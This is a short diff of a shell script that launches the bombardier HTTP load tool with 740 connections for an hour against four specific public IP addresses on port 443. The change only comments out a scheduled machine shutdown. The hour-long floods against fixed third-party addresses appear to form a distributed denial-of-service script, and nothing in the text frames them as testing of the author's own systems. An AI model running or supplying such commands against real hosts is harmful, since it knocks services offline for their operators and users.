@@ -7,4 +7,4 @@ bombardier -c 740 -d 3600s -l 185.79.118.2:443 --http2&
 bombardier -c 740 -d 3600s -l 185.178.208.74:443 --http2&
 bombardier -c 740 -d 3600s -l 185.178.208.163:443 --http2&
 bombardier -c 740 -d 3600s -l 185.46.11.253:443 --http2&
-sudo shutdown -P +62&
+#sudo shutdown -P +62&
